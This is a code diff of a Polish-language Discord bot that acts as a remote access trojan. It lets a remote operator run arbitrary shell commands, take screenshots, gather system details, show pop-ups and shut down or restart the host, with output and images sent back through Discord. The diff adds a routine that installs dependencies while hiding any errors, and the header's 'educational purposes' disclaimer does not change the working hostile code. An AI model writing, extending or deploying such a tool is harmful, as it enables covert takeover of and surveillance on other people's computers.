@@ -1,10 +1,29 @@
 # ⚠️ PROGRAM POWSTAŁ W CELACH EDUKACYJNYCH
 # NIE PONOSZĘ ODPOWIEDZIALNOŚCI ZA SZKODY
 # STWORZYŁ KOLOPA :D
-import discord
+
 import subprocess
-import os
 import sys
+import os
+
+def install_dependencies():
+    dependencies = {
+        "discord": "discord.py",
+        "pyautogui": "pyautogui",
+        "PIL": "pillow"
+    }
+    for module_name, pip_name in dependencies.items():
+        try:
+            __import__(module_name)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
+
+try:
+    install_dependencies()
+except Exception:
+    pass
+
+import discord
 import ctypes
 
 BOT_TOKEN = "{{BOT_TOKEN}}"
@@ -54,7 +73,7 @@ async def on_message(message):
         )
 
         embed.add_field(
-            name="⚙️ Konfiguracja",
+            name="Konfiguracja",
             value=f"**Prefiks:** `{PREFIX}`\n"
                   f"**Uprawniony użytkownik:** <@{AUTHORIZED_USER_ID if AUTHORIZED_USER_ID else 'Wszyscy'}>\n"
                   f"**Kanał główny:** <#{TARGET_CHANNEL_ID if TARGET_CHANNEL_ID else 'Dowolny'}>",
@@ -62,26 +81,26 @@ async def on_message(message):
         )
 
         embed.add_field(
-            name="📊 Informacje o systemie",
+            name="Informacje o systemie",
             value=f"`{PREFIX}info` - Pobiera zaawansowane informacje o systemie",
             inline=False
         )
 
         embed.add_field(
-            name="💬 Komunikaty",
+            name="Komunikaty",
             value=f"`{PREFIX}msgbox [tekst]` - Wyświetla wyskakujące okienko z wiadomością",
             inline=False
         )
 
         embed.add_field(
-            name="🛠️ Zarządzanie systemem",
+            name="Zarządzanie systemem",
             value=f"`{PREFIX}screenshot` - Robi i wysyła zrzut ekranu\n"
                   f"`{PREFIX}cmd [polecenie]` - Wykonuje standardową komendę CMD/Terminal",
             inline=False
         )
 
         embed.add_field(
-            name="🔌 Zasilanie i BOT",
+            name="Zasilanie i BOT",
             value=f"`{PREFIX}shutdown` - Wyłącza komputer stacyjny\n"
                   f"`{PREFIX}restart` - Uruchamia ponownie system\n"
                   f"`{PREFIX}exit` - Zamyka BOTA i kończy proces",
@@ -95,17 +114,17 @@ async def on_message(message):
             login = os.getlogin()
             sys_name = os.name
             info_text = (
-                f"👤 Użytkownik: {login}\n"
-                f"💻 Środowisko OS: {sys_name}\n"
-                f"📁 Katalog roboczy: {os.getcwd()}"
+                f"Użytkownik: {login}\n"
+                f"Środowisko OS: {sys_name}\n"
+                f"Katalog roboczy: {os.getcwd()}"
             )
             await message.channel.send(f"```\n{info_text}\n```")
         except Exception as e:
-            await message.channel.send(f"❌ Błąd zbierania informacji: {e}")
+            await message.channel.send(f"Błąd zbierania informacji: {e}")
           
     elif message.content.startswith(f"{PREFIX}msgbox "):
         text_to_show = message.content[len(f"{PREFIX}msgbox "):]
-        await message.channel.send(f"💬 Wyświetlam okienko z napisem: `{text_to_show}`")
+        await message.channel.send(f"Wyświetlam okienko z napisem: `{text_to_show}`")
         
         if os.name == "nt":
             import threading
@@ -115,10 +134,9 @@ async def on_message(message):
         else:
             await message.channel.send("Funkcja okienek systemowych jest wspierana tylko na Windows.")
 
-  
     elif message.content == f"{PREFIX}screenshot":
         import pyautogui
-        await message.channel.send("📸 Generowanie zrzutu ekranu...")
+        await message.channel.send("Generowanie zrzutu ekranu...")
         try:
             filename = "temp_ss.png"
             screenshot = pyautogui.screenshot()
@@ -129,7 +147,7 @@ async def on_message(message):
 
             os.remove(filename)
         except Exception as e:
-            await message.channel.send(f"❌ Nie udało się przechwycić ekranu: {e}")
+            await message.channel.send(f"Nie udało się przechwycić ekranu: {e}")
 
     elif message.content.startswith(f"{PREFIX}cmd "):
         command = message.content[len(f"{PREFIX}cmd "):]
@@ -141,15 +159,14 @@ async def on_message(message):
             except UnicodeDecodeError:
                 decoded_output = output.decode("utf-8", errors="replace")
         except subprocess.TimeoutExpired:
-            decoded_output = "❌ Błąd: Przekroczono czas oczekiwania na odpowiedź konsoli (12s)."
+            decoded_output = "Błąd: Przekroczono czas oczekiwania na odpowiedź konsoli (12s)."
         except Exception as e:
-            decoded_output = f"❌ Błąd przetwarzania komendy: {str(e)}"
+            decoded_output = f"Błąd przetwarzania komendy: {str(e)}"
 
         if len(decoded_output) > 1900:
             decoded_output = decoded_output[:1900] + "\n...[Wynik skrócony przez bufor bota]..."
 
         await message.channel.send(f"```\n{decoded_output}\n```")
-
 
     elif message.content == f"{PREFIX}shutdown":
         await message.channel.send("wyłączanie systemu (za 1 sekundę)...")
